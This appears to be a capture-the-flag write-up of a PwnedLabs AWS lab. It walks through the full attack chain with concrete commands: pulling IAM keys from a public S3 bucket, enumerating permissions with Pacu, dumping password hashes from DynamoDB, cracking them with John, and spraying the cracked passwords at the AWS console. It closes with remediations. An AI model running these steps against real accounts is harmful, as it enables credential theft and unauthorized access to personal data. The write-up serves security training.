## Disclosure
This documentation is intended for educational purposes only. All activities were performed within a controlled, authorized environment provided by [PwnedLabs](https://pwnedlabs.io/). This write-up focuses strictly on the methodology, vulnerability analysis, and security remediation techniques. All sensitive identifiers, including credentials, tokens, and specific PII, have been redacted or generalized to comply with security best practices and the platform's Terms of Service. The intent of this content is to foster professional development and contribute to the cybersecurity community's knowledge base.

**The lab:** https://pwnedlabs.io/labs/execute-and-identify-credential-abuse-in-aws

---
## Vulnerability Summary
The environment is vulnerable to a multi-stage attack chain resulting from excessive 
exposure of sensitive data in S3, poor credential management, and weak password 
policies in the AWS Console.

1. **Information Disclosure**: A public S3 bucket contained a `migration-backup.json` 
   file with hardcoded AWS IAM credentials, allowing an attacker to assume the 
   identity of a `migration-test` user.
2. **Credential Exfiltration**: Once authenticated, the attacker used automated tools 
   like `Pacu` and `aws-enumerator` to discover extensive permissions within the 
   `DynamoDB` service.
3. **Data Harvesting & Password Cracking**: The attacker scanned the `analytics_app_users` 
   table to extract user password hashes. By performing offline cracking (e.g., `John the Ripper`), 
   they successfully recovered plain-text credentials.
4. **Credential Spraying & Impact**: Using `GoAWSConsoleSpray`, the attacker validated 
   these credentials against the AWS Console. Successful login resulted in unauthorized 
   access to additional `DynamoDB` tables containing PII and system flags.

---
## Walkthrough
Start with just the xposed bucket `hl-storage-general` and list the contents without any creds:
```bash
aws s3 ls hl-storage-general --no-sign-request
```

We find a directory and a `.json` file that contains AWS creds we can use:
```bash
aws s3 cp s3://hl-storage-general/migration/asana-cloud-migration-backup.json . --no-sign-request
grep key asana-cloud-migration-backup.json

curl -I hl-storage-general.s3.amazonaws.com             # For the region

aws configure --profile test
aws sts get-caller-identity
```

The IAM user is `migration-test`. We start off with Pacu (an open-source AWS exploitation framework, designed for offensive security testing) by running `./cli.py`, creating a new session when prompted by entering `0`, and then seting the keys with `set_keys` :
```bash
git clone https://github.com/RhinoSecurityLabs/pacu.git 
  pip3 install -U pip
  pip3 install -U pacu
  pacu
cd pacu/
./cli.py
set_keys
```

Run `iam__bruteforce_permissions` to find various permissions related to the DynamoDB service:
```bash
> ls
> run iam__bruteforce_permissions
```

Set out keys in `aws-enumerate` and enumerate all services:
```bash
aws-enumerator cred                # Set our keys, or `~/go/bin/aws-enumerator cred`. Specify `-aws_region`, `-aws_access_key_id`, `aws_secret_access_key`, and `-aws_session_token`. Saved to `.env`
aws-enumerator enum -services all
aws-enumerator dump -services dynamodb
	DescribeEndpoints
	DescribeLimits
	ListTables
	ListBackups
	ListGlobalTables
```

Enumerate `dynamodb` service:
```bash
aws dynamodb list-tables --profile test
    "TableNames": [
        "analytics_app_users",
        "user_order_logs"
aws dynamodb describe-table --table analytics_app_users --profile test
	...
    "ItemCount": 51,                     # So when we download, we know it is not too much and manageable
```

Download the `analytics_app_users` table and find Password Hashes:
```bash
aws dynamodb scan --table-name analytics_app_users --profile test > output.json
strings output.json
```

Use `hashid`, `grep`, `vi`, and `awk` to determine hash of the password and output to a useble format:
```bash
hashid --john <HASH>                       # SHA-256 is promising
grep -r -A 1 'UserID\|PasswordHash' output.json | grep '"S"' | awk -F '"' '{ print $4 }' > user_hash
	username0
	hash0
	username1
	hash1
	...

--- Use vi macro: ---

vi user_hash
# start recording the macro
q
# name the macro "a"
a
# enter insert mode
i
# tap end of line button
End
# type :
:
# tap the delete key
Delete
# tap the down arrow key
down arrow
# exit insert mode
CTRL+C
# stop recording the macro
q
```

Now crack the hashes:
```bash
john user_hash --format=Raw-SHA256 --wordlist=/opt/lists/rockyou.txt --fork=4
john user_hash --format=Raw-SHA256 --show
```

Spray these username and password combos with [GoAWSConsoleSpray](https://github.com/WhiteOakSecurity/GoAWSConsoleSpray). This script takes an AWS account ID, a user list and a password list as parameters:
```bash
john user_hash --show --format=Raw-SHA256 | awk -F":" '{ print $1 }' > users
john user_hash --show --format=Raw-SHA256 | awk -F":" '{ print $2 }' > passwords
go install github.com/WhiteOakSecurity/GoAWSConsoleSpray@latest
./GoAWSConsoleSpray -a 243687662613 -u ../../users -p ../../passwords
	...
	2026/06/04 13:22:21 (<USER>)	[+] SUCCESS:	Valid Password: <PASS> 	MFA: false
	...
```

Now, we know we can log into the AWS Dashboard with these creds.

Try to view `user_order_logs` other DynamoDB table that we could not view earlier. `DynamoDB > Tables > Explore items`. This reveals PII of users and our flag

---
## Remediations
1. **Infrastructure Security**:
   - Strictly implement **S3 Block Public Access** for all buckets to prevent the 
     exposure of configuration files containing credentials.
   - Use `AWS Secrets Manager` to store and rotate application credentials 
     automatically, eliminating the need for hardcoded JSON files in S3.

2. **IAM Policy Hardening**:
   - Apply the **Principle of Least Privilege (PoLP)**; restrict `dynamodb:Scan` 
     permissions to only the specific identities and service roles that require them.
   - Enable `IAM Access Analyzer` to identify and remove unused permissions.

3. **Authentication & Identity Controls**:
   - Enforce **Multi-Factor Authentication (MFA)** for all AWS Console users, 
     including those with limited access, to prevent successful credential 
     spraying attacks.
   - Implement strong **Password Policies** and monitor for anomalous login 
     activity using `AWS CloudTrail` and `Amazon GuardDuty`.

4. **Monitoring & Detection**:
   - Monitor for bulk `dynamodb:Scan` operations, which are often indicative of 
     malicious data exfiltration.
   - Audit the `DynamoDB` environment for tables containing PII and ensure they 
     are encrypted at rest using `AWS KMS`.
